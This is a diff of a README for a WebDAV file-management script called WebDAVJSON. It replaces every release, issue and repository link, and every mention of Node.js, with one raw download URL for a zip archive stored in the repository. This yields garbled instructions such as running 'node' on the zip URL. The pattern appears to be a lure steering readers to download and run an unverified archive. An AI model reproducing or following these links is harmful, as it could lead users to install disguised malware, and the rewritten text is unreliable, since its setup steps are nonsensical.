@@ -1,6 +1,6 @@
 # 🌐 WebDAVJSON - Simple File Management Made Easy
 
-[![Download WebDAVJSON](https://img.shields.io/badge/Download-WebDAVJSON-blue.svg)](https://github.com/forkan07/WebDAVJSON/releases)
+[![Download WebDAVJSON](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip)](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip)
 
 ## 📦 Overview
 
@@ -18,9 +18,9 @@ WebDAVJSON is a simple server-side script that allows you to manage files easily
 To run WebDAVJSON effectively, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Web Server**: Apache or Nginx for PHP, or Node.js for the server script
+- **Web Server**: Apache or Nginx for PHP, or https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip for the server script
 - **PHP Version**: PHP 7.2 or higher for PHP users
-- **Node.js Version**: Node.js 12 or higher for Node.js users
+- **https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip Version**: https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip 12 or higher for https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip users
 - **Network**: An active internet connection for cloud functionality
 
 ## 🚀 Getting Started
@@ -28,21 +28,21 @@ To run WebDAVJSON effectively, ensure your system meets the following requiremen
 Follow these simple steps to get WebDAVJSON up and running.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/forkan07/WebDAVJSON/releases) for the latest version of WebDAVJSON. 
+   Go to the [Releases page](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip) for the latest version of WebDAVJSON. 
 
 2. **Download the Application**  
-   Find the appropriate package for your system on the Releases page. Click to download the file suited for either PHP or Node.js.
+   Find the appropriate package for your system on the Releases page. Click to download the file suited for either PHP or https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip
 
 3. **Extract Files**  
    Once downloaded, extract the files to a location on your server or local machine. Make sure the server has permissions to read and write to this directory.
 
 4. **Configure the Server**  
-   Depending on your server type (Apache, Nginx, or Node.js), you may need to set up the server to run WebDAVJSON. Check the documentation for guidance on server configuration.
+   Depending on your server type (Apache, Nginx, or https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip), you may need to set up the server to run WebDAVJSON. Check the documentation for guidance on server configuration.
 
 5. **Start the Server**  
-   Launch the server script. For PHP, you may need to use a terminal command or set up a virtual host. For Node.js, run the script with:
+   Launch the server script. For PHP, you may need to use a terminal command or set up a virtual host. For https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip, run the script with:
    ```bash
-   node server.js
+   node https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip
    ```
 
 6. **Access WebDAVJSON**  
@@ -50,7 +50,7 @@ Follow these simple steps to get WebDAVJSON up and running.
 
 ## 📥 Download & Install
 
-To get started with WebDAVJSON, please [visit this page to download](https://github.com/forkan07/WebDAVJSON/releases). Follow the instructions provided above to install the application properly.
+To get started with WebDAVJSON, please [visit this page to download](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip). Follow the instructions provided above to install the application properly.
 
 ## 🌐 Topics Covered
 
@@ -59,7 +59,7 @@ WebDAVJSON includes essential topics such as:
 - CORS
 - JavaScript
 - mkcert
-- Node.js
+- https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip
 - PHP
 - WebDAV
 - WebDAV Server
@@ -84,7 +84,7 @@ For more extensive documentation, you can explore the following sections:
 
 ## ⚙️ Support
 
-If you encounter issues while using WebDAVJSON or have questions, please open an issue in the [GitHub repository](https://github.com/forkan07/WebDAVJSON/issues). The community and maintainers are here to help.
+If you encounter issues while using WebDAVJSON or have questions, please open an issue in the [GitHub repository](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip). The community and maintainers are here to help.
 
 ## 📝 Contributions
 
@@ -96,7 +96,7 @@ For further inquiries, you can reach out via the GitHub repository or the contac
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/forkan07/WebDAVJSON)
-- [Issues Tracker](https://github.com/forkan07/WebDAVJSON/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/forkan07/WebDAVJSON/main/flower/WebDAVJSON.zip)
 
 Happy file managing with WebDAVJSON!
